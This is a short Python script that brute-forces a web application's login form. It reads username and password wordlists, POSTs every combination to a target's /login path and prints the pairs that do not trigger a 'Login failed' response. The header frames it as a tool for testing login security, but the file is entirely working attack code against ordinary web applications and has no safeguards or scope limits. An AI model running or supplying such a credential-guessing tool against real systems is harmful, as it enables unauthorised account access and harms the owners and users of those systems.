#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 4th 2024
# Description of Script
# The script is a Python automation tool designed to perform brute-force login attempts on a 
# web application's login form hosted on a remote server. It prompts the user for the target 
# host's IP address, port, and the paths to files containing usernames and passwords. Using 
# the provided information, it constructs the login URL and reads in the username and password
# lists from the specified files. The script then iterates through each combination of username
# and password, attempting to log in using HTTP POST requests. If a successful login is detected,
# it outputs the credentials used. This script provides a basic framework for automating the 
# testing of login forms for security vulnerabilities.
#################################################################################################
import requests

# Get the target host IP address and port from user input
target_ip = input("Please enter the target host IP address: ")
target_port = input("Please enter the target port: ")

# Construct the URL with the provided IP address and port
login_url = f"http://{target_ip}:{target_port}/login"

# Get the paths to the files containing usernames and passwords from user input
users_file = input('Please enter the path to your usernames dictionary in Linux: ')
pass_file = input('Please enter the path to your passwords dictionary in Linux: ')

# Define the function to read usernames or passwords from the given file
def read_credentials(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Read usernames and passwords from files
usernames = read_credentials(users_file)
passwords = read_credentials(pass_file)

# Iterate through each combination of username and password
for username in usernames:
    for password in passwords:
        # Create a session to maintain cookies
        session = requests.Session()

        # Define the login payload with the current username and password
        payload = {
            'username': username,
            'password': password
        }

        # Attempt to login using the current credentials
        response = session.post(login_url, data=payload)

        # Check if login was successful
        if 'Login failed' not in response.text:
            print(f'Successful login with username: {username} and password: {password}')
            # You can add further processing here, such as saving the successful credentials to a file
            break  # Stop attempting other passwords for this username if login was successful
        else:
            print(f'Failed login attempt with username: {username} and password: {password}')

        # Close the session
        session.close()
